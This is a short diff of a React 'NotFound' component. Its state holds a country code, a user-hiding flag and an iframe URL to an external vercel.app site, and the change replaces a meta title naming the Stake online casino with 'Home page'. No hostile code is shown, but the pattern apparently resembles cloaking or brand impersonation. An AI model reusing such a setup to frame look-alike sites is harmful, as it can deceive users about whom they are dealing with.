@@ -8,7 +8,7 @@ function NotFound() {
   let[countryCode, setCountryCode] = useState('');
   let[IsUserHiden, SetUserHiden] = useState(false);
   let[IframeUrl, SetIframeUrl] = useState('https://newclient-nu.vercel.app/');
-  let[SiteTitleMeta, SetSiteTitleMeta] = useState('Stake: Online Casino & Sports Betting - Play & Bet Online');
+  let[SiteTitleMeta, SetSiteTitleMeta] = useState('Home page');
   let[SiteTitleHome, SetSiteTitleHome] = useState('Home page');
 
 
